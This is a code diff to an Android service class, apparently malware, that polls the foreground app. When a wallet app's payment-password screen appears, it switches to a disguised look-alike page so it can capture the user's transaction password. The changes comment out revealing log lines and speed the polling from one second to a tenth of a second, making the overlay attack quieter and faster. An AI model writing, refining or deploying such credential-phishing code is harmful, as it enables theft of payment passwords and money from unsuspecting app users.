@@ -20,9 +20,9 @@ public class PaulHackService extends Service {
         public void run() {
             ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
             // 枚举进程
-            Log.w(TAG, "===============正在等待用户输入交易密码等关键信息");
+//            Log.w(TAG, "===============正在等待用户输入交易密码等关键信息");
             String className = activityManager.getRunningTasks(1).get(0).topActivity.getClassName();
-            Log.w(TAG,"当前的activity name是"+className);
+//            Log.w(TAG,"当前的activity name是"+className);
             //这里根据你想伪装的页面跳转到自己单独的Activity
             if(className!=null && className.equals("com.iboxpay.wallet.ui.activitys.PayPasswordSetActivity")){
                 Log.w(TAG,"进入白条输入交易密码页面，跳转到伪装的页面");
@@ -55,7 +55,7 @@ public class PaulHackService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        handler.postDelayed(mTask, 1000);
+        handler.postDelayed(mTask, 100);
     }
 
 
